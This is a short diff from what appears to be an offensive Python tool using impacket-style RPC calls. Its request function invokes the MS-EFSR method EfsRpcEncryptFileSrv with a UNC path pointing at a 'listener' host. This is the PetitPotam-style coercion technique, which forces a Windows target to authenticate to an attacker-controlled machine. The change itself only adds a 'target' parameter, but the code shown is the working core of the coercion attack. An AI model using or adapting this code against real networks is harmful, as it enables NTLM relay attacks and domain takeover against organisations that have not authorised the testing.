@@ -17,7 +17,7 @@ class EfsRpcEncryptFileSrvResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcEncryptFileSrv()
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
     dce.request(request)
